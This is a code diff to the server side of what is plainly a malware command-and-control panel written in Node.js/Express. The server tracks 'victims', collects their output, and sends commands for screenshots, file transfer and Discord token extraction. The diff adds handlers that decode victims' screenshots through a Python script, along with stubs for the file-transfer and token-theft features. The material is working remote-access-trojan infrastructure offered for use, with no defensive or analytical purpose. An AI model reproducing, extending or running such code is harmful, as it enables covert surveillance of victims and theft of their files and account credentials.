@@ -1,8 +1,14 @@
-const express = require("express");
-const cors = require("cors");
-const bodyParser = require("body-parser");
-const fs = require("fs");
-const path = require("path");
+import { spawn } from "child_process";
+import express from "express";
+import cors from "cors";
+import bodyParser from "body-parser";
+import fs from "fs";
+import path from "path";
+import { fileURLToPath } from "url";
+
+// Fix __dirname in ES modules
+const __filename = fileURLToPath(import.meta.url);
+const __dirname = path.dirname(__filename);
 
 const app = express();
 app.use(cors());
@@ -18,6 +24,7 @@ const victimsLastSeen = new Map(); // identity -> { last_seen, id }
 const idToIdentity = new Map(); // short_id -> identity
 let nextVictimId = 1;
 let outputLog = [];
+let current_command = "";
 
 // ====== Helpers ======
 function getIdentity(req) {
@@ -70,6 +77,46 @@ app.post("/api/clear", (req, res) => {
   res.sendStatus(200);
 });
 
+function handleScreenshot(output_data) {
+      console.log("Handling Screenshot Data...");
+      const pythonProcess = spawn(
+        "python",
+        ["Decode_Screenshot.py", output_data],
+        { cwd: "programs/screenshot" } 
+      );
+      console.log("Spawned Python.");
+      pythonProcess.stdout.on('data', (data) => {
+        console.log(data.toString()); // this will print output from Decode_Screenshot.py
+      });
+      current_command = "";
+}
+// TODO: Implement These two functions.
+//  [ ] handleFileTransfer needs a python decoder 
+//  [ ] handleDiscordTokenExtract needs to place output json in /temp folder
+function handleFileTransfer(output_data) {
+      console.log("Handling File Transfer Data...");
+      current_command = "";
+}
+function handleDiscordTokenExtract(output_data) {
+      console.log("Handling Discord Token Data...");
+      current_command = "";
+}
+
+function handleOutput(output_data) {
+  switch (current_command) {
+    case "/send_screenshot":
+      handleScreenshot(output_data);
+      console.log("Done Handling Screenshot.");
+      return;
+    case "/send_file_transfer":
+      handleFileTransfer(output_data);
+      return;
+    case "/send_discord_token_extract":
+      handleDiscordTokenExtract(output_data);
+      return;
+  }
+}
+
 // Victim sending output
 app.post("/output", (req, res) => {
   const identity = getIdentity(req);
@@ -78,9 +125,10 @@ app.post("/output", (req, res) => {
   const output = req.body.output;
   const ack = req.body.ack;
   const shortId = victimsLastSeen.get(identity).id;
-
+  
   if (output) {
     console.log(`[${shortId} Output]\n${output}`);
+    handleOutput(output);
     outputLog.push({
       victim_id: shortId,
       timestamp: new Date().toISOString().replace("T", " ").slice(0, 19),
@@ -105,6 +153,7 @@ app.post("/send-calc", (req, res) => {
 
 // Dashboard screenshot victim screen
 app.post("/send_screenshot", (req, res) => {
+  current_command = "/send_screenshot"
   const { victim_id } = req.body;
   const identity = idToIdentity.get(victim_id);
   if (!identity) return res.status(400).send("Invalid victim ID");
@@ -184,6 +233,7 @@ app.get("/api/dashboard", (req, res) => {
   }
   res.json({ victims, output_log: outputLog, now });
 });
+
 
 // ====== Start Server ======
 const PORT = 8000;
